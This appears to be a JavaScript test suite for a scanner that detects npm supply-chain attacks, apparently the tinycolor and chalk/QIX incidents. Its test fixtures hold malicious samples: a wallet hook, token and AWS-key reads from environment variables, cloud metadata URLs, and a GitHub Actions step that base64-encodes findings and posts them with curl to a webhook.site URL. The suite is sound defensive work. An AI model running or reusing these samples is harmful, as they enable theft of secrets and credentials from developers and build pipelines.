#!/usr/bin/env node

/**
 * Comprehensive Security Scanner Test Suite
 * Tests all detection patterns, whitelist functionality, and edge cases
 */

const PatternMatcher = require('../src/utils/patternMatcher');
const PackageScanner = require('../src/utils/packageScanner');
const Logger = require('../src/utils/logger');
const Validator = require('../src/utils/validator');
const fs = require('fs');
const path = require('path');

class SecurityTestSuite {
  constructor() {
    this.logger = new Logger({ level: 'error', console: false }); // Suppress logs during testing
    this.validator = new Validator();
    this.patternMatcher = new PatternMatcher(this.logger);
    this.packageScanner = new PackageScanner(this.logger, null, this.validator);
    this.tests = [];
    this.passed = 0;
    this.failed = 0;
  }

  /**
   * Add a test case
   */
  test(name, testFunction) {
    this.tests.push({ name, testFunction });
  }

  /**
   * Assert that a condition is true
   */
  assert(condition, message) {
    if (!condition) {
      throw new Error(message);
    }
  }

  /**
   * Run all tests
   */
  async run() {
    console.log('🧪 Running Comprehensive Security Scanner Test Suite\n');

    for (const test of this.tests) {
      try {
        await test.testFunction();
        console.log(`✅ ${test.name}`);
        this.passed++;
      } catch (error) {
        console.log(`❌ ${test.name}: ${error.message}`);
        this.failed++;
      }
    }

    console.log(`\n📊 Test Results: ${this.passed} passed, ${this.failed} failed`);
    return this.failed === 0;
  }
}

// Create test suite
const suite = new SecurityTestSuite();

// Test 1: QIX Attack Detection
suite.test('QIX Attack - Ethereum Wallet Hook', () => {
  const maliciousContent = `
    function checkethereumw() {
      if (window.ethereum) {
        window.ethereum.request({ method: 'eth_requestAccounts' });
      }
    }
  `;
  const issues = suite.patternMatcher.scanFileContent(maliciousContent, 'malicious.js', 'test-project');
  suite.assert(issues.length > 0, 'Should detect Ethereum wallet hook');
  suite.assert(issues.some(i => i.pattern === 'Ethereum Wallet Hook'), 'Should detect specific pattern');
});

// Test 2: QIX Attack - Crypto Address Replacement
suite.test('QIX Attack - Crypto Address Replacement', () => {
  const maliciousContent = `
    const maliciousAddress = "0x1234567890123456789012345678901234567890";
    const targetAddress = "0xabcdefabcdefabcdefabcdefabcdefabcdefabcd";
  `;
  const issues = suite.patternMatcher.scanFileContent(maliciousContent, 'malicious.js', 'test-project');
  suite.assert(issues.length > 0, 'Should detect crypto addresses');
  suite.assert(issues.some(i => i.pattern === 'Crypto Address Replacement'), 'Should detect specific pattern');
});

// Test 3: Tinycolor Attack - TruffleHog Binary Download
suite.test('Tinycolor Attack - TruffleHog Binary Download', () => {
  const maliciousContent = `
    const trufflehogUrl = "https://github.com/trufflesecurity/trufflehog/releases/download/v1.0.0/trufflehog_linux_x86_64.tar.gz";
    const downloadUrl = "trufflehog_windows_x86_64.zip";
  `;
  const issues = suite.patternMatcher.scanFileContent(maliciousContent, 'malicious.js', 'test-project');
  suite.assert(issues.length > 0, 'Should detect TruffleHog downloads');
  suite.assert(issues.some(i => i.pattern === 'TruffleHog Binary Download'), 'Should detect specific pattern');
});

// Test 4: Tinycolor Attack - Webhook Exfiltration
suite.test('Tinycolor Attack - Webhook Exfiltration', () => {
  const maliciousContent = `
    const webhookUrl = "https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7";
    const exfilUrl = "hxxps://webhook[.]site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7";
  `;
  const issues = suite.patternMatcher.scanFileContent(maliciousContent, 'malicious.js', 'test-project');
  suite.assert(issues.length > 0, 'Should detect webhook exfiltration');
  suite.assert(issues.some(i => i.pattern === 'Webhook Exfiltration Endpoint'), 'Should detect specific pattern');
});

// Test 5: Tinycolor Attack - Cloud Metadata Discovery
suite.test('Tinycolor Attack - Cloud Metadata Discovery', () => {
  const maliciousContent = `
    const imdsV4 = "http://169.254.169.254";
    const imdsV6 = "http://[fd00:ec2::254]";
    const gcpMeta = "http://metadata.google.internal";
  `;
  const issues = suite.patternMatcher.scanFileContent(maliciousContent, 'malicious.js', 'test-project');
  suite.assert(issues.length > 0, 'Should detect cloud metadata endpoints');
  suite.assert(issues.some(i => i.pattern === 'Cloud Metadata Discovery'), 'Should detect specific pattern');
});

// Test 6: Environment Variable Theft
suite.test('Environment Variable Theft Detection', () => {
  const maliciousContent = `
    const githubToken = process.env.GITHUB_TOKEN;
    const npmToken = process.env.NPM_TOKEN;
    const awsKey = process.env.AWS_ACCESS_KEY_ID;
  `;
  const issues = suite.patternMatcher.scanFileContent(maliciousContent, 'malicious.js', 'test-project');
  suite.assert(issues.length > 0, 'Should detect environment variable access');
  suite.assert(issues.some(i => i.pattern === 'Environment Variable Theft'), 'Should detect specific pattern');
});

// Test 7: Compromised Package Detection
suite.test('Compromised Package Detection', async() => {
  const packageJson = {
    dependencies: {
      '@ctrl/tinycolor': '4.1.2',
      angulartics2: '14.1.2',
      chalk: '5.6.1',
      debug: '4.4.2'
    }
  };

  const tempDir = path.join(__dirname, 'temp-test-project');
  const tempFile = path.join(tempDir, 'package.json');

  // Create temp directory and package.json
  if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir, { recursive: true });
  }
  fs.writeFileSync(tempFile, JSON.stringify(packageJson, null, 2));

  try {
    const results = await suite.packageScanner.scanPackageFiles(tempDir);
    suite.assert(results.compromisedPackages.length > 0, 'Should detect compromised packages');
    suite.assert(results.compromisedPackages.some(r => r.package === '@ctrl/tinycolor' && r.version === '4.1.2'), 'Should detect tinycolor attack');
    suite.assert(results.compromisedPackages.some(r => r.package === 'chalk' && r.version === '5.6.1'), 'Should detect QIX attack');
  } finally {
    // Clean up temp directory
    if (fs.existsSync(tempFile)) {
      fs.unlinkSync(tempFile);
    }
    if (fs.existsSync(tempDir)) {
      fs.rmdirSync(tempDir);
    }
  }
});

// Test 8: Whitelist Functionality - jspdf
suite.test('Whitelist - jspdf Polyfills', () => {
  const jspdfPath = 'node_modules/jspdf/dist/polyfills.umd.js';
  const isWhitelisted = suite.patternMatcher.isWhitelisted(jspdfPath, 'test-project');
  suite.assert(isWhitelisted !== null, 'jspdf polyfills should be whitelisted');
});

// Test 9: Whitelist Functionality - html2canvas
suite.test('Whitelist - html2canvas', () => {
  const html2canvasPath = 'node_modules/html2canvas/dist/html2canvas.js';
  const isWhitelisted = suite.patternMatcher.isWhitelisted(html2canvasPath, 'test-project');
  suite.assert(isWhitelisted !== null, 'html2canvas should be whitelisted');
});

// Test 10: Whitelist Functionality - react-git-info
suite.test('Whitelist - react-git-info', () => {
  const gitInfoPath = 'node_modules/react-git-info/src/GitInfo.macro.js';
  const isWhitelisted = suite.patternMatcher.isWhitelisted(gitInfoPath, 'test-project');
  suite.assert(isWhitelisted !== null, 'react-git-info should be whitelisted');
});

// Test 11: Non-whitelisted Malicious Content
suite.test('Non-whitelisted Malicious Content', () => {
  const maliciousContent = `
    const { execSync } = require("child_process");
    function trufflehogUrl() {
      return "https://github.com/trufflesecurity/trufflehog/releases/download/v1.0.0/trufflehog_linux_x86_64.tar.gz";
    }
  `;
  const maliciousPath = 'src/malicious.js';
  const issues = suite.patternMatcher.scanFileContent(maliciousContent, maliciousPath, 'test-project');
  suite.assert(issues.length > 0, 'Non-whitelisted malicious content should be detected');
});

// Test 12: Package Extraction from Path
suite.test('Package Extraction from Path', () => {
  const testPaths = [
    { path: 'node_modules/react/16.14.0/index.js', expected: { name: 'react', version: '16.14.0' } },
    { path: 'node_modules/@babel/core/7.20.0/lib/index.js', expected: { name: '@babel/core', version: '7.20.0' } },
    { path: 'node_modules/lodash/4.17.21/lodash.js', expected: { name: 'lodash', version: '4.17.21' } }
  ];

  testPaths.forEach(({ path: testPath, expected }) => {
    const result = suite.patternMatcher.extractPackageInfoFromPath(testPath, 'test-project');
    suite.assert(result !== null, `Should extract package info from ${testPath}`);
    suite.assert(result.name === expected.name, `Should extract correct package name: ${expected.name}`);
    suite.assert(result.version === expected.version, `Should extract correct version: ${expected.version}`);
  });
});

// Test 13: Version Whitelist Checking
suite.test('Version Whitelist Checking', () => {
  const isWhitelisted = suite.patternMatcher.isVersionWhitelisted('jspdf', '2.5.1', 'test-project');
  suite.assert(isWhitelisted === true, 'jspdf should be whitelisted for all versions');
});

// Test 14: GitHub Actions Workflow Detection
suite.test('GitHub Actions Workflow Detection', () => {
  const workflowContent = `
    name: shai-hulud-workflow
    on: [push]
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - name: Exfiltrate secrets
            run: |
              CONTENTS="$(cat findings.json | base64 -w0)"
              curl -s -X POST -d "$CONTENTS" "https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7"
  `;
  const issues = suite.patternMatcher.scanYamlFileContent(workflowContent, '.github/workflows/malicious.yml', 'test-project');
  suite.assert(issues.length > 0, 'Should detect malicious GitHub Actions workflow');
});

// Test 15: IOC Pattern Generation
suite.test('IOC Pattern Generation', () => {
  const iocs = {
    webhookEndpoints: ['https://webhook.site/test123'],
    cloudMetadataEndpoints: ['http://169.254.169.254'],
    truffleHogUrls: ['github.com/trufflesecurity/trufflehog/releases/download']
  };

  const patterns = suite.patternMatcher.createDynamicPatterns(iocs);
  suite.assert(patterns.length > 0, 'Should generate patterns from IOCs');
  suite.assert(patterns.some(p => p.name.includes('Webhook')), 'Should generate webhook patterns');
  suite.assert(patterns.some(p => p.name.includes('Cloud')), 'Should generate cloud metadata patterns');
  suite.assert(patterns.some(p => p.name.includes('TruffleHog')), 'Should generate TruffleHog patterns');
});

// Run the test suite
suite.run().then(success => {
  process.exit(success ? 0 : 1);
}).catch(error => {
  console.error('Test suite failed:', error);
  process.exit(1);
});
